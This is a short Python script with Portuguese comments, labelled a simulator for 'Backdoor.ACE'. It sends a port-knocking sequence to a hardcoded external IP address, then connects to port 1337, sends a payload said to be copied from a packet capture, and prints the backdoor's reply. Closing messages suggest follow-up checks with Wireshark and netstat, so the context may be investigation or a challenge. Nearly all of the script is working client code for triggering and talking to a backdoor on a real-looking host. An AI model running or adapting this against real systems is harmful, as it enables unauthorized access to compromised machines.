import socket
import time

# Configurações do malware
TARGET_IP = "37.59.174.235"
INFECTED_PORT = 1337
ACTIVATION_SEQUENCE = [13, 37, 30000, 3000]
TIMEOUT = 2  # Aumentei um pouco o timeout
RETRIES = 3  # Número de tentativas

def send_syn_packet(dest_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect_ex((TARGET_IP, dest_port))
        s.close()
        return True
    except:
        return False

def establish_backdoor():
    print("[*] Iniciando sequência de ativação do backdoor...")
    
    # 1. Sequência de ativação rápida
    for port in ACTIVATION_SEQUENCE:
        if send_syn_packet(port):
            print(f"[+] SYN aceito na porta {port}")
        else:
            print(f"[-] Falha no SYN para porta {port}")

    # 2. Conexão principal com retries
    for attempt in range(RETRIES):
        print(f"\n[*] Tentativa {attempt + 1}/{RETRIES} na porta {INFECTED_PORT}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            
            # Conexão rápida
            s.connect((TARGET_IP, INFECTED_PORT))
            print("[+] Conexão estabelecida! Enviando payload...")
            
            # Payload exato visto no PCAP
            s.sendall(b"[SYN] SeePS Win=512 Len=9\x00")
            
            # Tentar receber resposta
            try:
                response = s.recv(1024)
                if response:
                    print(f"[*] Resposta do backdoor: {response.hex()}")
                    print(f"[*] ASCII: {response.decode('ascii', errors='replace')}")
                else:
                    print("[*] Backdoor respondeu sem dados")
            except socket.timeout:
                print("[*] Nenhuma resposta recebida (timeout)")
            
            s.close()
            return True
            
        except ConnectionRefusedError:
            print("[-] Conexão recusada. Backdoor pode ter fechado.")
        except socket.timeout:
            print("[-] Timeout na conexão. Tentando novamente...")
        except Exception as e:
            print(f"[-] Erro inesperado: {str(e)}")
        
        time.sleep(0.5)  # Pequeno delay entre tentativas
    
    return False

if __name__ == "__main__":
    print("[*] Simulador avançado de Backdoor.ACE")
    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Activation sequence: {ACTIVATION_SEQUENCE}")
    print(f"[*] Backdoor port: {INFECTED_PORT}\n")
    
    if establish_backdoor():
        print("\n[+] Backdoor ativo e responsivo!")
        print("[*] Recomendado:")
        print(" - Capturar tráfego com Wireshark")
        print(" - Analisar processos no servidor")
        print(" - Verificar conexões ativas (netstat -tulnp)")
    else:
        print("\n[-] Não foi possível estabelecer comunicação estável")
        print("[*] Possíveis causas:")
        print(" - Backdoor não está ativo")
        print(" - Firewall bloqueando")
        print(" - Instabilidade na conexão")
